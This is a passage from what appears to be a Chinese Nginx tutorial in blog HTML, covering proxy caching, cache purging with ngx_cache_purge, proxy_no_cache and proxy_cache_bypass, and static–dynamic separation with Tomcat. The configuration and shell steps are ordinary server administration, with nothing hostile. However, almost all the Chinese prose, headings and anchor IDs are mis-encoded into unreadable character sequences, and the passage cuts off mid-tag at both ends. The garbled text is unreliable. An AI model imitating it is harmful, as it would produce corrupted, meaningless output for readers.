class="hljs-regexp">/js/</span>jquery.js<br></code></pre></td></tr></table></figure><p>Nginxçš„ç¯å¢ƒå‡†å¤‡</p><p>ï¼ˆ1ï¼‰å®ŒæˆNginxåå‘ä»£ç†é…ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">http&#123;<br>upstream backend&#123;<br>server <span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span>;<br>&#125;<br>server &#123;<br>listen       <span class="hljs-number">8080</span>;<br>        server_name  localhost;<br>        location / &#123;<br>        proxy_pass http:<span class="hljs-regexp">//</span>backend<span class="hljs-regexp">/js/</span>;<br>        &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å®ŒæˆNginxç¼“å­˜é…ç½®</p><p>4.æ·»åŠ ç¼“å­˜é…ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">http&#123;<br>proxy_cache_path <span class="hljs-regexp">/usr/</span>local/proxy_cache levels=<span class="hljs-number">2</span>:<span class="hljs-number">1</span> keys_zone=itcast:<span class="hljs-number">200</span>m inactive=<span class="hljs-number">1</span>d max_size=<span class="hljs-number">20</span>g;<br>upstream backend&#123;<br>server <span class="hljs-number">192.168</span>.<span class="hljs-number">23.132</span>:<span class="hljs-number">8080</span>;<br>&#125;<br>server &#123;<br>listen       <span class="hljs-number">8080</span>;<br>        server_name  localhost;<br>        location / &#123;<br>            proxy_cache itcast;<br>            proxy_cache_key itheima;<br>            proxy_cache_min_uses <span class="hljs-number">5</span>;<br>            proxy_cache_valid <span class="hljs-number">200</span> <span class="hljs-number">5</span>d;<br>            proxy_cache_valid <span class="hljs-number">404</span> <span class="hljs-number">30</span>s;<br>            proxy_cache_valid any <span class="hljs-number">1</span>m;<br>            add_header nginx-cache <span class="hljs-string">&quot;$upstream_cache_status&quot;</span>;<br>            proxy_pass http:<span class="hljs-regexp">//</span>backend<span class="hljs-regexp">/js/</span>;<br>        &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nginxç¼“å­˜çš„æ¸…é™¤"><a class="markdownIt-Anchor" href="#nginxç¼“å­˜çš„æ¸…é™¤"></a> Nginxç¼“å­˜çš„æ¸…é™¤</h2><h3 id="æ–¹å¼ä¸€åˆ é™¤å¯¹åº”çš„ç¼“å­˜ç›®å½•"><a class="markdownIt-Anchor" href="#æ–¹å¼ä¸€åˆ é™¤å¯¹åº”çš„ç¼“å­˜ç›®å½•"></a> æ–¹å¼ä¸€:åˆ é™¤å¯¹åº”çš„ç¼“å­˜ç›®å½•</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm -rf <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/proxy_cache/</span>......<br></code></pre></td></tr></table></figure><h3 id="æ–¹å¼äºŒä½¿ç”¨ç¬¬ä¸‰æ–¹æ‰©å±•æ¨¡å—"><a class="markdownIt-Anchor" href="#æ–¹å¼äºŒä½¿ç”¨ç¬¬ä¸‰æ–¹æ‰©å±•æ¨¡å—"></a> æ–¹å¼äºŒ:ä½¿ç”¨ç¬¬ä¸‰æ–¹æ‰©å±•æ¨¡å—</h3><h4 id="ngx_cache_purge"><a class="markdownIt-Anchor" href="#ngx_cache_purge"></a> ngx_cache_purge</h4><p>ï¼ˆ1ï¼‰ä¸‹è½½ngx_cache_purgeæ¨¡å—å¯¹åº”çš„èµ„æºåŒ…ï¼Œå¹¶ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ngx_cache_purge</span>-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.tar.gz<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¯¹èµ„æºæ–‡ä»¶è¿›è¡Œè§£å‹ç¼©</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tar</span> -zxf ngx_cache_purge-<span class="hljs-number">2</span>.<span class="hljs-number">3</span>.tar.gz<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰ä¿®æ”¹æ–‡ä»¶å¤¹åç§°ï¼Œæ–¹ä¾¿åæœŸé…ç½®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mv</span> ngx_cache_purge-<span class="hljs-number">2</span>.<span class="hljs-number">3</span> purge<br></code></pre></td></tr></table></figure><p>ï¼ˆ4ï¼‰æŸ¥è¯¢Nginxçš„é…ç½®å‚æ•°</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nginx -V</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ5ï¼‰è¿›å…¥Nginxçš„å®‰è£…ç›®å½•ï¼Œä½¿ç”¨./configureè¿›è¡Œå‚æ•°é…ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">.<span class="hljs-regexp">/configure --add-module=/</span>root<span class="hljs-regexp">/nginx/m</span>odule/purge<br></code></pre></td></tr></table></figure><p>ï¼ˆ6ï¼‰ä½¿ç”¨makeè¿›è¡Œç¼–è¯‘</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ7ï¼‰å°†nginxå®‰è£…ç›®å½•çš„nginxäºŒçº§åˆ¶å¯æ‰§è¡Œæ–‡ä»¶å¤‡ä»½</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">mv <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/nginx/</span>sbin<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx<span class="hljs-regexp">/sbin/</span>nginxold<br></code></pre></td></tr></table></figure><p>ï¼ˆ8ï¼‰å°†ç¼–è¯‘åçš„objsä¸­çš„nginxæ‹·è´åˆ°nginxçš„sbinç›®å½•ä¸‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cp objs<span class="hljs-regexp">/nginx /u</span>sr<span class="hljs-regexp">/local/</span>nginx/sbin<br></code></pre></td></tr></table></figure><p>ï¼ˆ9ï¼‰ä½¿ç”¨makeè¿›è¡Œå‡çº§</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">make upgrade</span><br></code></pre></td></tr></table></figure><p>ï¼ˆ10ï¼‰åœ¨nginxé…ç½®æ–‡ä»¶ä¸­è¿›è¡Œå¦‚ä¸‹é…ç½®</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">server&#123;<br><span class="hljs-keyword">location</span> <span class="hljs-title">~/purge</span>(/.*) &#123;<br>proxy_cache_purge itcast itheima;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="nginxè®¾ç½®èµ„æºä¸ç¼“å­˜"><a class="markdownIt-Anchor" href="#nginxè®¾ç½®èµ„æºä¸ç¼“å­˜"></a> Nginxè®¾ç½®èµ„æºä¸ç¼“å­˜</h2><p>å‰é¢å’±ä»¬å·²ç»å®Œæˆäº†Nginxä½œä¸ºwebç¼“å­˜æœåŠ¡å™¨çš„ä½¿ç”¨ã€‚ä½†æ˜¯æˆ‘ä»¬å¾—æ€è€ƒä¸€ä¸ªé—®é¢˜å°±æ˜¯ä¸æ˜¯æ‰€æœ‰çš„æ•°æ®éƒ½é€‚åˆè¿›è¡Œç¼“å­˜ã€‚æ¯”å¦‚è¯´å¯¹äºä¸€äº›ç»å¸¸å‘ç”Ÿå˜åŒ–çš„æ•°æ®ã€‚å¦‚æœè¿›è¡Œç¼“å­˜çš„è¯ï¼Œå°±å¾ˆå®¹æ˜“å‡ºç°ç”¨æˆ·è®¿é—®åˆ°çš„æ•°æ®ä¸æ˜¯æœåŠ¡å™¨çœŸå®çš„æ•°æ®ã€‚æ‰€ä»¥å¯¹äºè¿™äº›èµ„æºæˆ‘ä»¬åœ¨ç¼“å­˜çš„è¿‡ç¨‹ä¸­å°±éœ€è¦è¿›è¡Œè¿‡æ»¤ï¼Œä¸è¿›è¡Œç¼“å­˜ã€‚</p><p>Nginxä¹Ÿæä¾›äº†è¿™å—çš„åŠŸèƒ½è®¾ç½®ï¼Œéœ€è¦ä½¿ç”¨åˆ°å¦‚ä¸‹ä¸¤ä¸ªæŒ‡ä»¤</p><h3 id="proxy_no_cache"><a class="markdownIt-Anchor" href="#proxy_no_cache"></a> proxy_no_cache</h3><p>è¯¥æŒ‡ä»¤æ˜¯ç”¨æ¥å®šä¹‰ä¸å°†æ•°æ®è¿›è¡Œç¼“å­˜çš„æ¡ä»¶ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_no_cache string â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>é…ç½®å®ä¾‹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_no_cache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br></code></pre></td></tr></table></figure><h3 id="proxy_cache_bypass"><a class="markdownIt-Anchor" href="#proxy_cache_bypass"></a> proxy_cache_bypass</h3><p>è¯¥æŒ‡ä»¤æ˜¯ç”¨æ¥è®¾ç½®ä¸ä»ç¼“å­˜ä¸­è·å–æ•°æ®çš„æ¡ä»¶ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>proxy_cache_bypass string â€¦;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>â€”</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€location</td></tr></tbody></table><p>é…ç½®å®ä¾‹</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">proxy_cache_bypass</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br></code></pre></td></tr></table></figure><p>ä¸Šè¿°ä¸¤ä¸ªæŒ‡ä»¤éƒ½æœ‰ä¸€ä¸ªæŒ‡å®šçš„æ¡ä»¶ï¼Œè¿™ä¸ªæ¡ä»¶å¯ä»¥æ˜¯å¤šä¸ªï¼Œå¹¶ä¸”å¤šä¸ªæ¡ä»¶ä¸­è‡³å°‘æœ‰ä¸€ä¸ªä¸ä¸ºç©ºä¸”ä¸ç­‰äº&quot;0&quot;,åˆ™æ¡ä»¶æ»¡è¶³æˆç«‹ã€‚ä¸Šé¢ç»™çš„é…ç½®å®ä¾‹æ˜¯ä»å®˜æ–¹ç½‘ç«™è·å–çš„ï¼Œé‡Œé¢ä½¿ç”¨åˆ°äº†ä¸‰ä¸ªå˜é‡ï¼Œåˆ†åˆ«æ˜¯$cookie_nocacheã€$arg_nocacheã€$arg_comment</p><h3 id="cookie_nocache-arg_nocache-arg_comment"><a class="markdownIt-Anchor" href="#cookie_nocache-arg_nocache-arg_comment"></a> $cookie_nocacheã€$arg_nocacheã€$arg_comment</h3><p>è¿™ä¸‰ä¸ªå‚æ•°åˆ†åˆ«ä»£è¡¨çš„å«ä¹‰æ˜¯:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$cookie</span>_nocache</span><br>æŒ‡çš„æ˜¯å½“å‰è¯·æ±‚çš„cookieä¸­é”®çš„åç§°ä¸ºnocacheå¯¹åº”çš„å€¼<br><span class="hljs-meta"><span class="hljs-keyword">$arg</span>_nocacheå’Œ$arg_comment</span><br>æŒ‡çš„æ˜¯å½“å‰è¯·æ±‚çš„å‚æ•°ä¸­å±æ€§åä¸ºnocacheå’Œcommentå¯¹åº”çš„å±æ€§å€¼<br></code></pre></td></tr></table></figure><p>æ¡ˆä¾‹æ¼”ç¤ºä¸‹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">log_format</span> params <span class="hljs-variable">$cookie_nocache</span> | <span class="hljs-variable">$arg_nocache</span> | <span class="hljs-variable">$arg_comment</span>ï¼›<br>server&#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8081</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">access_log</span> logs/access_params.log params;<br><span class="hljs-attribute">add_header</span> Set-Cookie <span class="hljs-string">&#x27;nocache=999&#x27;</span>;<br><span class="hljs-attribute">root</span> html;<br><span class="hljs-attribute">index</span> index.html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æ¡ˆä¾‹å®ç°"><a class="markdownIt-Anchor" href="#æ¡ˆä¾‹å®ç°"></a> æ¡ˆä¾‹å®ç°</h3><p>è®¾ç½®ä¸ç¼“å­˜èµ„æºçš„é…ç½®æ–¹æ¡ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">server&#123;<br>listen8080;<br>server_name localhost;<br>location / &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_uri</span> ~ /.*\.js$)&#123;<br>           <span class="hljs-built_in">set</span> <span class="hljs-variable">$nocache</span> 1;<br>        &#125;<br>    proxy_no_cache <span class="hljs-variable">$nocache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br>        proxy_cache_bypass <span class="hljs-variable">$nocache</span> <span class="hljs-variable">$cookie_nocache</span> <span class="hljs-variable">$arg_nocache</span> <span class="hljs-variable">$arg_comment</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="nginxå®ç°æœåŠ¡å™¨ç«¯é›†ç¾¤æ­å»º"><a class="markdownIt-Anchor" href="#nginxå®ç°æœåŠ¡å™¨ç«¯é›†ç¾¤æ­å»º"></a> Nginxå®ç°æœåŠ¡å™¨ç«¯é›†ç¾¤æ­å»º</h1><h2 id="nginxä¸tomcatéƒ¨ç½²"><a class="markdownIt-Anchor" href="#nginxä¸tomcatéƒ¨ç½²"></a> Nginxä¸Tomcatéƒ¨ç½²</h2><p>å‰é¢è¯¾ç¨‹å·²ç»å°†Nginxçš„å¤§éƒ¨åˆ†å†…å®¹è¿›è¡Œäº†è®²è§£ï¼Œæˆ‘ä»¬éƒ½çŸ¥é“äº†Nginxåœ¨é«˜å¹¶å‘åœºæ™¯å’Œå¤„ç†é™æ€èµ„æºæ˜¯éå¸¸é«˜æ€§èƒ½çš„ï¼Œä½†æ˜¯åœ¨å®é™…é¡¹ç›®ä¸­é™¤äº†é™æ€èµ„æºè¿˜æœ‰å°±æ˜¯åå°ä¸šåŠ¡ä»£ç æ¨¡å—ï¼Œä¸€èˆ¬åå°ä¸šåŠ¡éƒ½ä¼šè¢«éƒ¨ç½²åœ¨Tomcatï¼Œweblogicæˆ–è€…æ˜¯websphereç­‰webæœåŠ¡å™¨ä¸Šã€‚é‚£ä¹ˆå¦‚ä½•ä½¿ç”¨Nginxæ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚å¹¶æŠŠè¯·æ±‚è½¬å‘åˆ°åå°webæœåŠ¡å™¨ï¼Ÿ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604498725652.png" alt="1604498725652" /></p><p>æ­¥éª¤åˆ†æ:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.å‡†å¤‡Tomcatç¯å¢ƒï¼Œå¹¶åœ¨Tomcatä¸Šéƒ¨ç½²ä¸€ä¸ªwebé¡¹ç›®<br>2.å‡†å¤‡Nginxç¯å¢ƒï¼Œä½¿ç”¨Nginxæ¥æ”¶è¯·æ±‚ï¼Œå¹¶æŠŠè¯·æ±‚åˆ†å‘åˆ°Tomatä¸Š<br></code></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå‡†å¤‡tomcat"><a class="markdownIt-Anchor" href="#ç¯å¢ƒå‡†å¤‡tomcat"></a> ç¯å¢ƒå‡†å¤‡(Tomcat)</h3><p>æµè§ˆå™¨è®¿é—®:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/i</span>ndex.html<br></code></pre></td></tr></table></figure><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604421296014.png" alt="1604421296014" /></p><p>è·å–åŠ¨æ€èµ„æºçš„é“¾æ¥åœ°å€:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><p>æœ¬æ¬¡è¯¾ç¨‹å°†é‡‡ç”¨Tomcatä½œä¸ºåå°webæœåŠ¡å™¨</p><p>ï¼ˆ1ï¼‰åœ¨Centosä¸Šå‡†å¤‡ä¸€ä¸ªTomcat</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.Tomcatå®˜ç½‘åœ°å€:https://tomcat.apache.org/<br><span class="hljs-attribute">2</span>.ä¸‹è½½tomcat,æœ¬æ¬¡è¯¾ç¨‹ä½¿ç”¨çš„æ˜¯apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">59</span>.tar.gz<br><span class="hljs-attribute">3</span>.å°†tomcatè¿›è¡Œè§£å‹ç¼©<br><span class="hljs-attribute">mkdir</span> web_tomcat<br><span class="hljs-attribute">tar</span> -zxf apache-tomcat-<span class="hljs-number">8</span>.<span class="hljs-number">5</span>.<span class="hljs-number">59</span>.tar.gz -C /web_tomcat<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å‡†å¤‡ä¸€ä¸ªwebé¡¹ç›®ï¼Œå°†å…¶æ‰“åŒ…ä¸ºwar</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.å°†èµ„æ–™ä¸­çš„demo.warä¸Šä¼ åˆ°tomcat8ç›®å½•ä¸‹çš„webappsåŒ…ä¸‹<br>2.å°†tomcatè¿›è¡Œå¯åŠ¨ï¼Œè¿›å…¥tomcat8çš„binç›®å½•ä¸‹<br>./startup.sh<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰å¯åŠ¨tomcatè¿›è¡Œè®¿é—®æµ‹è¯•ã€‚</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">é™æ€èµ„æº: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/i</span>ndex.html<br>åŠ¨æ€èµ„æº: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.146</span>:<span class="hljs-number">8080</span><span class="hljs-regexp">/demo/g</span>etAddress<br></code></pre></td></tr></table></figure><h3 id="ç¯å¢ƒå‡†å¤‡nginx"><a class="markdownIt-Anchor" href="#ç¯å¢ƒå‡†å¤‡nginx"></a> ç¯å¢ƒå‡†å¤‡(Nginx)</h3><p>ï¼ˆ1ï¼‰ä½¿ç”¨Nginxçš„åå‘ä»£ç†ï¼Œå°†è¯·æ±‚è½¬ç»™Tomcatè¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs fsharp">upstream <span class="hljs-keyword">webservice</span> &#123;<br>server <span class="hljs-number">192.168</span><span class="hljs-number">.200</span><span class="hljs-number">.146</span><span class="hljs-operator">:</span>8080;<br>&#125;<br><span class="hljs-keyword">server</span>&#123;<br>    listen<span class="hljs-number">80</span>;<br>    server_name localhost;<br>    location <span class="hljs-operator">/</span><span class="hljs-keyword">demo</span> &#123;<br>    proxy_pass http<span class="hljs-operator">:</span><span class="hljs-comment">//webservice;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰å¯åŠ¨è®¿é—®æµ‹è¯•</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604421312486.png" alt="1604421312486" /></p><p>å­¦ä¹ åˆ°è¿™ï¼Œå¯èƒ½å¤§å®¶ä¼šæœ‰ä¸€ä¸ªå›°æƒ‘ï¼Œæ˜æ˜ç›´æ¥é€šè¿‡tomcatå°±èƒ½è®¿é—®ï¼Œä¸ºä»€ä¹ˆè¿˜éœ€è¦å¤šåŠ ä¸€ä¸ªnginxï¼Œè¿™æ ·ä¸æ˜¯åè€Œæ˜¯ç³»ç»Ÿçš„å¤æ‚åº¦å˜é«˜äº†ä¹ˆ?<br />é‚£æ¥ä¸‹æ¥æˆ‘ä»¬ä»ä¸¤ä¸ªæ–¹ä¾¿ç»™å¤§å®¶åˆ†æä¸‹è¿™ä¸ªé—®é¢˜ï¼Œ</p><p>ç¬¬ä¸€ä¸ªä½¿ç”¨Nginxå®ç°åŠ¨é™åˆ†ç¦»</p><p>ç¬¬äºŒä¸ªä½¿ç”¨Nginxæ­å»ºTomcatçš„é›†ç¾¤</p><h2 id="nginxå®ç°åŠ¨é™åˆ†ç¦»"><a class="markdownIt-Anchor" href="#nginxå®ç°åŠ¨é™åˆ†ç¦»"></a> Nginxå®ç°åŠ¨é™åˆ†ç¦»</h2><p>ä»€ä¹ˆæ˜¯åŠ¨é™åˆ†ç¦»?</p><p>åŠ¨:åå°åº”ç”¨ç¨‹åºçš„ä¸šåŠ¡å¤„ç†</p><p>é™:ç½‘ç«™çš„é™æ€èµ„æº(html,javaScript,css,imagesç­‰æ–‡ä»¶)</p><p>åˆ†ç¦»:å°†ä¸¤è€…è¿›è¡Œåˆ†å¼€éƒ¨ç½²è®¿é—®ï¼Œæä¾›ç”¨æˆ·è¿›è¡Œè®¿é—®ã€‚ä¸¾ä¾‹è¯´æ˜å°±æ˜¯ä»¥åæ‰€æœ‰å’Œé™æ€èµ„æºç›¸å…³çš„å†…å®¹éƒ½äº¤ç»™Nginxæ¥éƒ¨ç½²è®¿é—®ï¼Œéé™æ€å†…å®¹åˆ™äº¤ä¸ªç±»ä¼¼äºTomcatçš„æœåŠ¡å™¨æ¥éƒ¨ç½²è®¿é—®ã€‚</p><p>ä¸ºä»€ä¹ˆè¦åŠ¨é™åˆ†ç¦»?</p><p>â€‹å‰é¢æˆ‘ä»¬ä»‹ç»è¿‡Nginxåœ¨å¤„ç†é™æ€èµ„æºçš„æ—¶å€™ï¼Œæ•ˆç‡æ˜¯éå¸¸é«˜çš„ï¼Œè€Œä¸”Nginxçš„å¹¶å‘è®¿é—®é‡ä¹Ÿæ˜¯ååˆ—å‰èŒ…ï¼Œè€ŒTomcatåˆ™ç›¸å¯¹æ¯”è¾ƒå¼±ä¸€äº›ï¼Œæ‰€ä»¥æŠŠé™æ€èµ„æºäº¤ä¸ªNginxåï¼Œå¯ä»¥å‡è½»TomcatæœåŠ¡å™¨çš„è®¿é—®å‹åŠ›å¹¶æé«˜é™æ€èµ„æºçš„è®¿é—®é€Ÿåº¦ã€‚</p><p>â€‹åŠ¨é™åˆ†ç¦»ä»¥åï¼Œé™ä½äº†åŠ¨æ€èµ„æºå’Œé™æ€èµ„æºçš„è€¦åˆåº¦ã€‚å¦‚åŠ¨æ€èµ„æºå®•æœºäº†ä¹Ÿä¸å½±å“é™æ€èµ„æºçš„å±•ç¤ºã€‚</p><p>å¦‚ä½•å®ç°åŠ¨é™åˆ†ç¦»?</p><p>å®ç°åŠ¨é™åˆ†ç¦»çš„æ–¹å¼å¾ˆå¤šï¼Œæ¯”å¦‚é™æ€èµ„æºå¯ä»¥éƒ¨ç½²åˆ°CDNã€Nginxç­‰æœåŠ¡å™¨ä¸Šï¼ŒåŠ¨æ€èµ„æºå¯ä»¥éƒ¨ç½²åˆ°Tomcat,weblogicæˆ–è€…websphereä¸Šã€‚æœ¬æ¬¡è¯¾ç¨‹åªè¦ä½¿ç”¨Nginx+Tomcatæ¥å®ç°åŠ¨é™åˆ†ç¦»ã€‚</p><h3 id="éœ€æ±‚åˆ†æ-3"><a class="markdownIt-Anchor" href="#éœ€æ±‚åˆ†æ-3"></a> éœ€æ±‚åˆ†æ</h3><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604422564855.png" alt="1604422564855" /></p><h3 id="åŠ¨é™åˆ†ç¦»å®ç°æ­¥éª¤"><a class="markdownIt-Anchor" href="#åŠ¨é™åˆ†ç¦»å®ç°æ­¥éª¤"></a> åŠ¨é™åˆ†ç¦»å®ç°æ­¥éª¤</h3><p>1.å°†demo.waré¡¹ç›®ä¸­çš„é™æ€èµ„æºéƒ½åˆ é™¤æ‰ï¼Œé‡æ–°æ‰“åŒ…ç”Ÿæˆä¸€ä¸ªwaråŒ…ï¼Œåœ¨èµ„æ–™ä¸­æœ‰æä¾›ã€‚</p><p>2.å°†waråŒ…éƒ¨ç½²åˆ°tomcatä¸­ï¼ŒæŠŠä¹‹å‰éƒ¨ç½²çš„å†…å®¹åˆ é™¤æ‰</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">è¿›å…¥åˆ°tomcatçš„webappsç›®å½•ä¸‹ï¼Œå°†ä¹‹å‰çš„å†…å®¹åˆ é™¤æ‰<br>å°†æ–°çš„waråŒ…å¤åˆ¶åˆ°webappsä¸‹<br>å°†tomcatå¯åŠ¨<br></code></pre></td></tr></table></figure><p>3.åœ¨Nginxæ‰€åœ¨æœåŠ¡å™¨åˆ›å»ºå¦‚ä¸‹ç›®å½•ï¼Œå¹¶å°†å¯¹åº”çš„é™æ€èµ„æºæ”¾å…¥æŒ‡å®šçš„ä½ç½®</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1604493947499.png" alt="1604493947499" /></p><p>å…¶ä¸­index.htmlé¡µé¢çš„å†…å®¹å¦‚ä¸‹:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 